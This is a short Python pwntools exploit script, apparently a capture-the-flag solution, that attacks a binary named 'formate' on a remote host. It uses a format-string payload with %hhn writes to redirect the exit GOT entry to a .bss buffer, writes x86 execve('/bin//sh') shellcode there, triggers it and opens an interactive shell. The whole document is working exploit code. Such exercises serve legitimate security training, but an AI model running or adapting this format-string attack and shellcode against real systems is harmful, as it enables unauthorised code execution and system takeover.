#!/usr/bin/env python2.7
# -*- coding:utf8 -*-
from pwn import *
DEBUG = 0
elf = ELF('./formate')

if DEBUG:
    #context.log_level = 'debug'
    io = process('./formate')
else:
    io = remote('118.89.138.44', 30006)

def call_func2(data):
    io.recvuntil('input your choice:\n')
    io.sendline('2')
    io.recvline()
    io.sendline(data)

def call_func3():
    io.recvuntil('input your choice:\n')
    io.sendline('3')

got_exit = elf.got['exit']
bss_addr = 0x08049180#no-pie 全局变量地址恒定
addr1 = bss_addr & 0xff
addr2 = (bss_addr&0xff00) >> 8

payload = p32(got_exit) + p32(got_exit+1)
payload += '%' + str(addr1-8) + 'c%7$hhn'
payload += '%' + str((addr2-addr1)&0xff) + 'c%8$hhn'
#格式化字串漏洞，将exit的got表修改为bss段全局变量地址

call_func2(payload)
sleep(1)
call_func3()
#向全局变量地址写入shellcode
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"
sleep(1)
call_func2(shellcode)
io.recvuntil('input your choice:\n')
io.sendline('4')#跳转执行
io.interactive()